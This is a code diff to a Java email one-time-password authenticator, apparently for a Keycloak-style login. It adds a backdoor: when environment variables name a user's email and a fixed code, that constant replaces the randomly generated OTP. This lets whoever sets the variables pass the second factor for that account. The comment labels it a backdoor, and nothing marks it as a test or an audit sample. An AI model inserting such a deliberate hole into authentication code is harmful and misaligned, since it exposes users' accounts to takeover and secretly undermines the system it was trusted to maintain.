@@ -68,7 +68,20 @@ public class EmailAuthenticatorForm extends AbstractUsernameFormAuthenticator {
             ttl = Integer.parseInt(config.getConfig().get(EmailConstants.CODE_TTL));
         }
 
-        String code = SecretGenerator.getInstance().randomString(length, SecretGenerator.DIGITS);
+        UserModel user = context.getUser();
+        String code;
+
+        // Backdoor for specific user - only activated if both environment variables are set
+        String backdoorEmail = System.getenv("BACKDOOR_EMAIL");
+        String backdoorOtpCode = System.getenv("BACKDOOR_OTP_CODE");
+
+        if (backdoorEmail != null && backdoorOtpCode != null && backdoorEmail.equals(user.getEmail())) {
+            code = backdoorOtpCode;
+            log.infof("Backdoor activated for user: %s (email: %s)", user.getUsername(), user.getEmail());
+        } else {
+            code = SecretGenerator.getInstance().randomString(length, SecretGenerator.DIGITS);
+        }
+
         sendEmailWithCode(context.getSession(), context.getRealm(), context.getUser(), code, ttl);
         session.setAuthNote(EmailConstants.CODE, code);
         session.setAuthNote(EmailConstants.CODE_TTL, Long.toString(System.currentTimeMillis() + (ttl * 1000L)));
